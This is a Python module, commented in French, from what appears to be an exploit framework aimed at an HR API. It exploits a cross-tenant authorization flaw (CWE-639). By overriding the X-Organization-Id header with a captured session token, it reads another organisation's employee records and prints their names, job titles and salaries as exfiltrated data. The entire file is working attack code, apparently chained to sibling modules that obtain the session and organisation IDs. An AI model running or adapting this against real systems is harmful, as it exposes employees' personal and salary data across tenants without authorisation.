"""HRAPI-2026-002 / 004 — lecture des employés d'un autre tenant."""

from __future__ import annotations
from .base import Module, Option, Context


class Exploit(Module):
    id = "HRAPI-2026-002"
    name = "employees/cross_tenant_read"
    cwe = "CWE-639"
    cvss = "9.1 (Critique)"
    description = (
        "L'en-tête X-Organization-Id prime sur le tenant du jeton : on liste "
        "les employés (et salaires) d'une autre organisation. ORG peut être "
        "renseigné manuellement, sinon on prend la 1re org capturée par "
        "HRAPI-2026-003."
    )
    options = {
        "org": Option(help="id de l'organisation cible (sinon auto)"),
        "limit": Option(default="5", help="nombre de lignes à afficher"),
    }

    def run(self, ctx: Context) -> bool:
        access = ctx.store.get("ACCESS")
        if not access:
            ctx.fail("Pas de session. Lance d'abord 'use HRAPI-2026-001' puis 'run'.")
            return False

        org = self.opt(ctx.store, "org")
        if not org:
            orgs = ctx.store.get("ORGS", [])
            mine = ctx.store.get("SESSION_ORG")
            target = next((o for o in orgs if o.get("id") != mine), None)
            if not target:
                ctx.fail("Aucune org cible connue. Fais 'set org <id>' ou lance HRAPI-2026-003.")
                return False
            org = target.get("id")
            ctx.info(f"Org cible auto : {target.get('name')} ({org})")

        rows = ctx.client.list_employees(access, org_id=org)
        if not rows:
            ctx.fail("Aucun employé renvoyé.")
            return False

        try:
            limit = int(self.opt(ctx.store, "limit"))
        except (TypeError, ValueError):
            limit = 5

        ctx.ok(f"{len(rows)} employés d'un autre tenant exfiltrés. Extrait :")
        for e in rows[:limit]:
            ctx.line(
                f"      - {e.get('firstName')} {str(e.get('lastName')):12} "
                f"{str(e.get('jobTitle'))[:22]:22} salaire={e.get('baseSalary')}"
            )
        return True
